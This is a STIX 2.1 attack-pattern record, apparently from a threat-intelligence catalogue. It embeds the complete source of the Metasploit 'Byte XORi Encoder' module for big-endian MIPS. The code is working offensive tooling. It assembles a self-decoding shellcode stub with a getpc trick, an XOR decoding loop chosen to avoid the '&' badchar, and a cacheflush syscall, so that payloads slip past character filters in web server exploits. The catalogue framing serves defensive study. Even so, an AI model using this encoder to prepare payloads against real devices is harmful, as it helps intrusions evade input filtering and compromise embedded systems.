{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--dc607d7f-7e21-4430-b603-e0ebde498e83",
    "created": "2024-08-14T16:33:19.240476Z",
    "modified": "2024-08-14T16:33:19.24048Z",
    "name": "Byte XORi Encoder",
    "description": " Mips Web server exploit friendly xor encoder. This encoder has been found useful on situations where '&' (0x26) is a badchar. Since 0x26 is the xor's opcode on MIPS architectures, this one is based on the xori instruction. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/encoders/mipsbe/byte_xori.rb",
            "external_id": "byte_xori.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'metasm'\n\nclass MetasploitModule < Msf::Encoder::Xor\n  Rank = NormalRanking\n\n  def initialize\n    super(\n      'Name'             => 'Byte XORi Encoder',\n      'Description'      => %q{\n        Mips Web server exploit friendly xor encoder. This encoder has been found useful on\n        situations where '&' (0x26) is a badchar. Since 0x26 is the xor's opcode on MIPS\n        architectures, this one is based on the xori instruction.\n      },\n      'Author'           =>\n        [\n          'Julien Tinnes <julien[at]cr0.org>',  # original longxor encoder, which this one is based on\n          'juan vazquez',                       # byte_xori encoder\n          'Pedro Ribeiro <pedrib@gmail.com>',   # fix for Linux >= 2.6.11 (set up cacheflush() args properly)\n        ],\n      'Arch'             => ARCH_MIPSBE,\n      'License'          => MSF_LICENSE,\n      'Decoder'          =>\n        {\n          'KeySize'   => 1,\n          'BlockSize' => 1,\n          'KeyPack'   => 'C',\n        })\n  end\n\n  #\n  # Returns the decoder stub that is adjusted for the size of the buffer\n  # being encoded.\n  #\n  def decoder_stub(state)\n\n    # add 4 number of passes  for the space reserved for the key, at the end of the decoder stub\n    # (see commented source)\n    number_of_passes=state.buf.length+4\n    raise EncodingError.new(\"The payload being encoded is too long (#{state.buf.length} bytes)\") if number_of_passes > 32766\n\n    # 16-bits not (again, see also commented source)\n    reg_14 = (number_of_passes+1)^0xFFFF\n    reg_5 = state.buf.length^0xFFFF\n\n    decoder = Metasm::Shellcode.assemble(Metasm::MIPS.new(:big), <<EOS).encoded.data\nmain:\n\nli macro reg, imm\n  addiu reg, $0, imm                     ; 0x24xxyyyy - xx: reg #, yyyy: imm # imm must be equal or less than 0x7fff\nendm\n\n  li      ($14, #{reg_14})               ; 0x240exxxx - store in $14 the number of passes (two's complement) - xxxx (number of passes)\n  nor     $14, $14, $0                   ; 0x01c07027 - get in $14 the number of passes\n  li      ($11,-84)                      ; 0x240bffac - store in $11 the offset to the end of the decoder (two's complement) (from the addu instr)\n\n; acts as getpc\nnext:\n  bltzal  $8, next                       ; 0x0510ffff - branch to next if $8 < 0, store return address in $31 ($ra); pipelining executes next instr.\n  slti    $8, $0, 0x#{slti_imm(state)}   ; 0x2808xxxx - Set $8 = 0; Set $8 = 1 if $0 < imm; else $8 = 0 / xxxx: imm\n\n  nor     $11, $11, $0                   ; 0x01605827 - get in $11 the offset to the end of the decoder (from the addu instr)\n  addu    $25, $31, $11                  ; 0x03ebc821 - get in $25 a pointer to the end of the decoder stub\n  addu\t  $16, $31, $11\t\t             ; $16 too (used to set up the cacheflush() arg down below)\n\n  slti    $23, $0, 0x#{slti_imm(state)}  ; 0x2817xxxx - Set $23 = 0 (Set $23 = 1 if $0 < imm; else $23 = 0) / xxxx: imm\n  lb      $17, -1($25)                   ; 0x8f31fffc - Load xor key in $17 (stored on the last byte of the decoder stub)\n\n; Init $6 and $15\n  li      ($13, -4)                      ; 0x240dfffc - $13 = -4\n  nor     $6, $13, $0                    ; 0x01a03027 - $6 = 3 ; used to easily get the cacheflush parameter\n  addi    $15, $6, -2                    ; 0x20cffffe - $15 = 1 ($15 = decoding loop counter increment)\n\n; In order avoid null bytes, decode also the xor key, so memory can be\n; referenced with offset -1\nloop:\n  lb      $8, -4($25)                    ; 0x8f28fffc - Load in $8 the byte to decode\n  addu    $23, $23, $15                  ; 0x02efb821 - Increment the counter ($23)\n  xori    $3, $8, 0x#{padded_key(state)} ; 0x01111826 - xori decoding instruction, store the decoded byte on $3\n  #{set_on_less_than(state)}             ; 0x02eef0xx - $30 = 1 if $23 < $14; else $30 = 0 (update branch condition) / xx: 0x2b if slti, 0x2a if slt\n  sb      $3, -4($25)                    ; 0xaf23fffc - Store decoded byte on memory\n  bne     $0, $30, loop                  ; 0x17c0fff9 - branch to loop if $30 != 0 (ranch while bytes to decode)\n  addu    $25, $25, $15                  ; 0x032dc821 - next instruction to decode, executed because of the pipelining\n\n  addiu\t$4, $16, -4                      ; cacheflush() addr parameter\n  li(      $10,#{reg_5})                 ; cacheflush() nbytes parameter\n  nor   $5, $10, $0                      ; same as above\n\n  li      ($2, 4147)                     ; 0x24021033 - cacheflush sytem call\n  syscall 0x52950                        ; 0x014a540c\n  nop                                    ; encoded shellcoded must be here (xor key right here ;) after decoding will result in a nop\nEOS\n\n    return decoder\n  end\n\n\n  def padded_key(state, size=1)\n    key = Rex::Text.rand_text(size, state.badchars)\n    key << [state.key].pack(\"C\")\n    return key.unpack(\"n\")[0].to_s(16)\n  end\n\n  # Returns an two-bytes immediate value without badchars. The value must be\n  # on the 0x8000-0x8fff so it is used as negative value by slti (set less\n  # than signed immediate)\n  def slti_imm(state)\n    imm = Rex::Text.rand_text(2, state.badchars + (0x00..0x7f).to_a.pack(\"C*\"))\n    return imm.unpack(\"n\")[0].to_s(16)\n  end\n\n  # Since 0x14 contains the number of passes, and because of the li macro, can't be\n  # longer than 0x7fff, both sltu (unsigned) and slt (signed) operations can be used\n  # here\n  def set_on_less_than(state)\n    instructions = {\n      \"sltu   $30, $23, $14\" => \"\\x02\\xee\\xf0\\x2b\", # set less than unsigned\n      \"slt    $30, $23, $14\" => \"\\x02\\xee\\xf0\\x2a\"  # set less than\n    }\n\n    instructions.each do |k,v|\n      if Rex::Text.badchar_index(v, state.badchars) == nil\n        return k\n      end\n    end\n\n    raise BadcharError.new,\n          \"The #{self.name} encoder failed to encode the decoder stub without bad characters.\",\n          caller\n  end\n\n  def encode_finalize_stub(state, stub)\n    # Including the key into the stub by ourselves because it should be located\n    # in the last 4 bytes of the decoder stub. In this way decoding will convert\n    # these bytes into a nop instruction (0x00000000). The Msf::Encoder only supports\n    # one decoder_key_offset position\n    real_key = state.key\n    stub[-4, state.decoder_key_size] = [ real_key.to_i ].pack(state.decoder_key_pack)\n    stub[-3, state.decoder_key_size] = [ real_key.to_i ].pack(state.decoder_key_pack)\n    stub[-2, state.decoder_key_size] = [ real_key.to_i ].pack(state.decoder_key_pack)\n    stub[-1, state.decoder_key_size] = [ real_key.to_i ].pack(state.decoder_key_pack)\n    return stub\n  end\nend\n"
}